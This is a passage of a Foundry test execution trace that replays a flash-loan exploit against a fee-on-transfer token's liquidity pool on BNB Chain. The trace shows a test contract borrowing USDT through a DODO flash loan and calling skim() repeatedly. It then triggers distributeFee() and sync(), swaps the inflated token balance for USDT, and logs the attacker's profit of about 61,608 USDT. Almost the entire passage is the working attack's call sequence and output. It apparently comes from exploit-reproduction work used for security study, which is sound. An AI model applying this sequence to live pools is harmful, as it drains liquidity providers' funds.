    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2174434860076186137163595 [2.174e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 450512937468415167868499 [4.505e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 13515388124052455036054 [1.351e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 405461643721573651081650 [4.054e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2160919471952133682127541 [2.16e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 436997549344362712832445 [4.369e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 13109926480330881384973 [1.31e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 393297794409926441549201 [3.932e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2147809545471802800742568 [2.147e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 423887622864031831447472 [4.238e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 12716628685920954943424 [1.271e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 381498860577628648302725 [3.814e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2135092916785881845799144 [2.135e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 411170994178110876504048 [4.111e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 12335129825343326295121 [1.233e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 370053894760299788853644 [3.7e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2122757786960538519504023 [2.122e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 398835864352767550208927 [3.988e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 11965075930583026506267 [1.196e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 358952277917490795188035 [3.589e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2110792711029955492997756 [2.11e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 386870788422184523702660 [3.868e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 11606123652665535711079 [1.16e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 348183709579966071332394 [3.481e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2099186587377289957286677 [2.099e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 375264664769518987991581 [3.752e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 11257939943085569639747 [1.125e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 337738198292567089192423 [3.377e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2087928647434204387646930 [2.087e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 364006724826433418351834 [3.64e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 10920201744793002550555 [1.092e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 327606052343790076516651 [3.276e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2077008445689411385096375 [2.077e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 353086523081640415801279 [3.53e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 10592595692449212474038 [1.059e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 317777870773476374221152 [3.177e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2066415849996962172622337 [2.066e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 342493927389191203327241 [3.424e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 10274817821675736099817 [1.027e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 308244534650272082994517 [3.082e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [139502] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::distributeFee()
    │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0xEb55526075eC7797d5CdcF4C3263fA39004B958D, value: 575883424365482759987922 [5.758e23])
    │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x05DE4Ea6D2472EB569B55e6A1Ada52d2a451d854, value: 287941712182741379993961 [2.879e23])
    │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x7c31f5c790CeA93d83aD94F92037Abc1c0d5740d, value: 287941712182741379993961 [2.879e23])
    │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x3E1BA8607304EdC3d26eA6Fba67C09cEb2890AcA, value: 287941712182741379993961 [2.879e23])
    │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x3777aeec31907057c16F0b4dDC34A6B0a5dC53b6, value: 287941712182741379993961 [2.879e23])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [9352] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::sync()
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 20246224428566073564237 [2.024e22]
    │   │   │   ├─ emit Sync(reserve0: 164026931732834970073285 [1.64e23], reserve1: 20246224428566073564237 [2.024e22])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 1397994775043681721471611 [1.397e24]
    │   │   ├─ [58843] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(1397994775043681721471611 [1.397e24], 0, [0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1670403423 [1.67e9])
    │   │   │   ├─ [10148] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 1397994775043681721471611 [1.397e24])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 41939843251310451644148 [4.193e22])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 1356054931792371269827463 [1.356e24])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [893] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23], 20246224428566073564237 [2.024e22], 1670403423 [1.67e9]
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 1376301156220937343391700 [1.376e24]
    │   │   │   ├─ [38639] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::swap(161608037844960494164175 [1.616e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   ├─ [23171] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 161608037844960494164175 [1.616e23])
    │   │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 161608037844960494164175 [1.616e23])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2418893887874475909110 [2.418e21]
    │   │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1376301156220937343391700 [1.376e24]
    │   │   │   │   ├─ emit Sync(reserve0: 2418893887874475909110 [2.418e21], reserve1: 1376301156220937343391700 [1.376e24])
    │   │   │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 1356054931792371269827463 [1.356e24], amount0Out: 161608037844960494164175 [1.616e23], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 161608037844960494164175 [1.616e23]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A, 100000000000000000000000 [1e23])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A, value: 100000000000000000000000 [1e23])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [2531] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   │   └─ ← [Return] 8484590463931700355 [8.484e18]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   │   └─ ← [Return] 836944312816628772067694 [8.369e23]
    │   ├─ [531] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   │   └─ ← [Return] 8484590463931700355 [8.484e18]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   │   └─ ← [Return] 836944312816628772067694 [8.369e23]
    │   ├─ emit DODOFlashLoan(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 100000000000000000000000 [1e23])
    │   └─ ← [Stop] 
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 61608037844960494164175 [6.16e22]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDT balance after exploit", val: 61608037844960494164175 [6.16e22], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 408.83ms (7.44ms CPU time)

Ran 2 test suites in 411.61ms (688.92ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
